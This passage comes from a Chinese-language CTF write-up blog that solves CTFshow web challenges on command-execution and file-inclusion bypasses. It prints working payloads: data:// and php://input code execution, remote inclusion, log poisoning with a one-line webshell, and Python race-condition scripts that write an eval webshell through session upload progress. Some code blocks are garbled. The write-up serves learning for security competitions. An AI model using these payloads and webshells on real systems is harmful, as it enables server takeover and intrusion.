<span class="s1">&#39;decbin&#39;</span><span class="p">,</span> <span class="s1">&#39;dechex&#39;</span><span class="p">,</span> <span class="s1">&#39;decoct&#39;</span><span class="p">,</span> <span class="s1">&#39;deg2rad&#39;</span><span class="p">,</span> <span class="s1">&#39;exp&#39;</span><span class="p">,</span> <span class="s1">&#39;expm1&#39;</span><span class="p">,</span> <span class="s1">&#39;floor&#39;</span><span class="p">,</span> <span class="s1">&#39;fmod&#39;</span><span class="p">,</span> <span class="s1">&#39;getrandmax&#39;</span><span class="p">,</span> <span class="s1">&#39;hexdec&#39;</span><span class="p">,</span> <span class="s1">&#39;hypot&#39;</span><span class="p">,</span> <span class="s1">&#39;is_finite&#39;</span><span class="p">,</span> <span class="s1">&#39;is_infinite&#39;</span><span class="p">,</span> <span class="s1">&#39;is_nan&#39;</span><span class="p">,</span> <span class="s1">&#39;lcg_value&#39;</span><span class="p">,</span> <span class="s1">&#39;log10&#39;</span><span class="p">,</span> <span class="s1">&#39;log1p&#39;</span><span class="p">,</span> <span class="s1">&#39;log&#39;</span><span class="p">,</span> <span class="s1">&#39;max&#39;</span><span class="p">,</span> <span class="s1">&#39;min&#39;</span><span class="p">,</span> <span class="s1">&#39;mt_getrandmax&#39;</span><span class="p">,</span> <span class="s1">&#39;mt_rand&#39;</span><span class="p">,</span> <span class="s1">&#39;mt_srand&#39;</span><span class="p">,</span> <span class="s1">&#39;octdec&#39;</span><span class="p">,</span> <span class="s1">&#39;pi&#39;</span><span class="p">,</span> <span class="s1">&#39;pow&#39;</span><span class="p">,</span> <span class="s1">&#39;rad2deg&#39;</span><span class="p">,</span> <span class="s1">&#39;rand&#39;</span><span class="p">,</span> <span class="s1">&#39;round&#39;</span><span class="p">,</span> <span class="s1">&#39;sin&#39;</span><span class="p">,</span> <span class="s1">&#39;sinh&#39;</span><span class="p">,</span> <span class="s1">&#39;sqrt&#39;</span><span class="p">,</span> <span class="s1">&#39;srand&#39;</span><span class="p">,</span> <span class="s1">&#39;tan&#39;</span><span class="p">,</span> <span class="s1">&#39;tanh&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="nx">preg_match_all</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">,</span> <span class="nv">$used_funcs</span><span class="p">);</span>  
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$used_funcs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$func</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;请不要输入奇奇怪怪的函数&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="c1">//帮你算出答案
</span></span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="c1"></span>    <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;echo &#39;</span><span class="o">.</span><span class="nv">$content</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题设置了白名单和黑名单，白名单是数学函数，黑名单则是一些符号，而且有长度限制</p>
<p>这题的思路其实就是要考虑用数字通过数学运算函数的转换来构造出我们需要用到的字符</p>
<p>就比如我们可以先将需要的字符转换成16进制后再转换成10进制，再执行命令的时候通过数学函数转换回去</p>
<p><a href="https://www.cnblogs.com/FallenStar/articles/17064728.html">CTFshow-WEB入门-命令执行web124 - Hacker&amp;Cat - 博客园</a></p>
<pre tabindex="0"><code>目标代码：$_GET[&#39;abs&#39;]($_GET[&#39;acos&#39;])
</code></pre><pre tabindex="0"><code>dechex()，10进制转16进制

base_convert(值,原进制,目标进制)，任意进制转换

hex2bin，16进制转字符串
</code></pre><p>解题：</p>
<p>base_convert(26941962055,10,34) 为 hex2bin</p>
<p>base_convert(26941962055,10,34)(dechex(1598506324)) 为 _GET</p>
<p>构造payload</p>
<pre tabindex="0"><code>c=$pi=base_convert(26941962055,10,34)(dechex(1598506324));$$pi{abs}($$pi{asin})&amp;abs=system&amp;asin=ls
</code></pre><hr>
<h3 id="文件包含"><strong>文件包含</strong><a hidden class="anchor" aria-hidden="true" href="#文件包含">#</a></h3>
<blockquote>
<p>以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()</p></blockquote>
<h4 id="web78">Web78<a hidden class="anchor" aria-hidden="true" href="#web78">#</a></h4>
<p>php伪协议</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 10:52:43
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-16 10:54:20
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>payload:</p>
<blockquote>
<p>?file=data://text/plain,<?php system("cat flag.php")?></p></blockquote>
<p>查看源代码，得到flag</p>
<p><img alt="image-20241121192438056" loading="lazy" src="./assets/image-20241121192438056.png"></p>
<h4 id="web79">web79<a hidden class="anchor" aria-hidden="true" href="#web79">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:10:14
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-16 11:12:38
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题相对于上一题会将file中的php替换为???</p>
<p>我们可以通过base64进行绕过</p>
<pre tabindex="0"><code>?file=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=
</code></pre><p>or</p>
<pre tabindex="0"><code>?file=data://text/plain,&lt;?=system(&#39;tac flag*&#39;);?&gt; 

?file=data://text/plain,&lt;?Php echo `tac f*`;?&gt;
</code></pre><p>or</p>
<p>远程加载</p>
<blockquote>
<p>加载robots.txt，发现可以回显</p>
<p>在自己vps上创建1.txt，内容如下 <code>&lt;?php system(&quot;tac flag.php&quot;);?&gt;</code></p>
<p>起一个http服务，加载 <code>url/?file=http://x.x.x.x:7001/1.txt</code></p></blockquote>
<p>or</p>
<p>input协议 大小写绕过</p>
<p>payload:</p>
<pre tabindex="0"><code>POST /?file=Php://input HTTP/1.1

&lt;?Php system(&#34;cat flag.php&#34;);?&gt;
</code></pre><h4 id="web80">web80<a hidden class="anchor" aria-hidden="true" href="#web80">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="err">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="err">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="err">Accept-Encoding: gzip, deflate
</span></span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="err">DNT: 1
</span></span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="err">Cookie: UM_distinctid=17ffcdc88eb73a-022664ffe42c5b8-13676d4a-1fa400-17ffcdc88ec82c
</span></span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="err">Connection: close
</span></span></span></code></pre></div><p>写入一句话木马</p>
<p><img alt="image-20241121201547420" loading="lazy" src="./assets/image-20241121201547420.png"></p>
<p>连webshell工具或者直接get传参</p>
<pre tabindex="0"><code>?file=/var/log/nginx/access.log&amp;2=system(&#39;ls /var/www/html&#39;);phpinfo();

?file=/var/log/nginx/access.log&amp;2=system(&#39;tac /var/www/html/fl0g.php&#39;);phpinfo();
</code></pre><p>Or</p>
<p>input协议 大小写绕过</p>
<p>payload:</p>
<pre tabindex="0"><code>POST /?file=Php://input HTTP/1.1

&lt;?Php system(&#34;cat flag.php&#34;);?&gt;
</code></pre><p><img alt="image-20241121202826975" loading="lazy" src="./assets/image-20241121202826975.png"></p>
<h4 id="web81">web81<a hidden class="anchor" aria-hidden="true" href="#web81">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       <span class="cp">?&gt;</span><span class="err">&#39;);?&gt;&#34;
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="err">    data = {&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: code}
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="err">    cookies = {&#39;PHPSESSID&#39;: PHPSESSID}
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="err">    files = {&#39;file&#39;: (&#39;xxx.txt&#39;, BytesIO(b&#39;x&#39; * 10240))}
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="err">    while True:
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="err">        post(URL, data, cookies=cookies, files=files)
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="err">def read():
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="err">    params = {&#39;file&#39;: f&#39;/tmp/sess_{PHPSESSID}&#39;}
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="err">    while True:
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="err">        get(URL, params)
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="err">        url = urljoin(URL, &#39;shell.php&#39;)
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="err">        code = get(url).status_code.real
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="err">        print(f&#39;{url} {code}&#39;)
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="err">        if code == 200:
</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="err">            exit()
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="err">if __name__ == &#39;__main__&#39;:
</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="err">    Thread(target=write, daemon=True).start()
</span></span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="err">    read()
</span></span></span></code></pre></div><p>poc2</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">import</span> <span class="nx">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">import</span> <span class="nx">io</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">import</span> <span class="nx">threading</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nx">url</span><span class="o">=</span><span class="s1">&#39;http://9a77fcb3-6f3c-4bd6-a247-07bfe6766509.challenge.ctf.show:8080/&#39;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">sessionid</span><span class="o">=</span><span class="s1">&#39;ctfshow&#39;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nx">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">	<span class="s2">&#34;1&#34;</span><span class="o">:</span><span class="s2">&#34;file_put_contents(&#39;/var/www/html/jiuzhen.php&#39;,&#39;&lt;?php eval(</span><span class="si">$_POST[3]</span><span class="s2">);?&gt;&#39;);&#34;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1">#这个是访问/tmp/sess_ctfshow时，post传递的内容，是在网站目录下写入一句话木马。这样一旦访问成功，就可以蚁剑连接了。
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="c1"></span><span class="nx">def</span> <span class="nx">write</span><span class="p">(</span><span class="nx">session</span><span class="p">)</span><span class="o">:</span><span class="c1">#/tmp/sess_ctfshow中写入一句话木马。
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="c1"></span>	<span class="nx">fileBytes</span> <span class="o">=</span> <span class="nx">io</span><span class="o">.</span><span class="nx">BytesIO</span><span class="p">(</span><span class="nx">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">1024</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">	<span class="k">while</span> <span class="k">True</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">		<span class="nx">response</span><span class="o">=</span><span class="nx">session</span><span class="o">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">			<span class="nx">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">			<span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class="o">:</span><span class="s1">&#39;&lt;?php eval($_POST[1]);?&gt;&#39;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">			<span class="p">},</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">			<span class="nx">cookies</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">			<span class="s1">&#39;PHPSESSID&#39;</span><span class="o">:</span><span class="nx">sessionid</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">			<span class="p">},</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">			<span class="nx">files</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">			<span class="s1">&#39;file&#39;</span><span class="o">:</span><span class="p">(</span><span class="s1">&#39;ctfshow.jpg&#39;</span><span class="p">,</span><span class="nx">fileBytes</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">			<span class="p">)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="nx">def</span> <span class="nx">read</span><span class="p">(</span><span class="nx">session</span><span class="p">)</span><span class="o">:</span><span class="c1">#访问/tmp/sess_ctfshow，post传递信息，在网站目录下写入木马。
</span></span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="c1"></span>	<span class="k">while</span> <span class="k">True</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">		<span class="nx">response</span><span class="o">=</span><span class="nx">session</span><span class="o">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">url</span><span class="o">+</span><span class="s1">&#39;?file=/tmp/sess_&#39;</span><span class="o">+</span><span class="nx">sessionid</span><span class="p">,</span><span class="nx">data</span><span class="o">=</span><span class="nx">data</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">			<span class="nx">cookies</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">			<span class="s1">&#39;PHPSESSID&#39;</span><span class="o">:</span><span class="nx">sessionid</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">			<span class="p">)</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">		<span class="nx">resposne2</span><span class="o">=</span><span class="nx">session</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">url</span><span class="o">+</span><span class="s1">&#39;jiuzhen.php&#39;</span><span class="p">);</span><span class="c1">#访问木马文件，如果访问到了就代表竞争成功
</span></span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="nx">resposne2</span><span class="o">.</span><span class="nx">status_code</span><span class="o">==</span><span class="mi">200</span><span class="o">:</span><span class="nx">了</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">			<span class="k">print</span><span class="p">(</span><span class="s1">&#39;++++++done++++++&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">		<span class="k">else</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">			<span class="k">print</span><span class="p">(</span><span class="nx">resposne2</span><span class="o">.</span><span class="nx">status_code</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="k">if</span> <span class="nx">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">
</span></span><span class="line"><span class="ln">41</span><span class="cl">	<span class="nx">evnet</span><span class="o">=</span><span class="nx">threading</span><span class="o">.</span><span class="nx">Event</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">	<span class="c1">#写入和访问分别设置5个线程。
</span></span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="c1"></span>	<span class="nx">with</span> <span class="nx">requests</span><span class="o">.</span><span class="nx">session</span><span class="p">()</span> <span class="k">as</span> <span class="nx">session</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">		<span class="k">for</span> <span class="nx">i</span> <span class="nx">in</span> <span class="nx">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">			<span class="nx">threading</span><span class="o">.</span><span class="nx">Thread</span><span class="p">(</span><span class="nx">target</span><span class="o">=</span><span class="nx">write</span><span class="p">,</span><span class="nx">args</span><span class="o">=</span><span class="p">(</span><span class="nx">session</span><span class="p">,))</span><span class="o">.</span><span class="nx">start</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">		<span class="k">for</span> <span class="nx">i</span> <span class="nx">in</span> <span class="nx">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="o">:</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">			<span class="nx">threading</span><span class="o">.</span><span class="nx">Thread</span><span class="p">(</span><span class="nx">target</span><span class="o">=</span><span class="nx">read</span><span class="p">,</span><span class="nx">args</span><span class="o">=</span><span class="p">(</span><span class="nx">session</span><span class="p">,))</span><span class="o">.</span><span class="nx">start</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">
</span></span><span class="line"><span class="ln">49</span><span class="cl">	<span class="nx">evnet</span><span class="o">.</span><span class="nx">set</span><span class="p">()</span>
</span></span></code></pre></div><p><img alt="image-20241123014155194" loading="lazy" src="assets/image-20241123014155194.png"></p>
<p>getshell</p>
<p><img alt="image-20241123014312621" loading="lazy" src="assets/image-20241123014312621.png"></p>
<p>直接查flag</p>
<p><strong>利用条件</strong></p>
<blockquote>
<ol>
<li>存在文件包含漏洞</li>
<li>知道session文件存放路径，可以尝试默认路径</li>
<li>具有读取和写入session文件的权限</li>
</ol></blockquote>
<p>这两个脚本理论上适用于<code>web82-web86</code></p>
<h4 id="web83">web83<a hidden class="anchor" aria-hidden="true" href="#web83">#</a></h4>
<p>web83的开篇设置了session_unset();session_destroy();</p>
<blockquote>
<p>session_unset()：释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的。
session_destroy()：删除当前用户对应的session文件以及释放sessionid，内存中的$_SESSION变量内容依然保留。</p></blockquote>
<p>就是释放和清除了前面所有session变量和文件，但是我们的解题思路是竞争上传那一瞬间创建的session，所以不影响。</p>
<h4 id="web84">web84<a hidden class="anchor" aria-hidden="true" href="#web84">#</a></h4>
<p>加上了一个<code>system(rm -rf /tmp/*);</code>，但是因为本来session.upload_progress.cleanup = on，就会清空对应session文件中的内容，这里加上删除，对竞争的影响不大。（但是可能需要增加一些线程）</p>
<h4 id="web85">web85<a hidden class="anchor" aria-hidden="true" href="#web85">#</a></h4>
<p>添加了一个内容识别，如果有&lt;就die，依旧可以竞争。</p>
<h4 id="web86">web86<a hidden class="anchor" aria-hidden="true" href="#web86">#</a></h4>
<p>dirname(<strong>FILE</strong>)表示当前文件的绝对路径。set_include_path函数,是用来设置include的路径的，就是include()可以不提供文件的完整路径了。
include文件时,当包含路径既不是相对路径，也不是绝对路径时(如:include(“test.php”))，会先查找include_path所设置的目录。
脚本里用的是完整路径，不影响竞争。</p>
<blockquote>
<p>web82-86：参考https://blog.csdn.net/m0_48780534/article/details/125410757</p></blockquote>
<h4 id="web87">web87<a hidden class="anchor" aria-hidden="true" href="#web87">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-16 21:57:55
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="s2">&#34;???&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$file</span><span class="p">),</span> <span class="s2">&#34;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&#34;</span><span class="o">.</span><span class="nv">$content</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
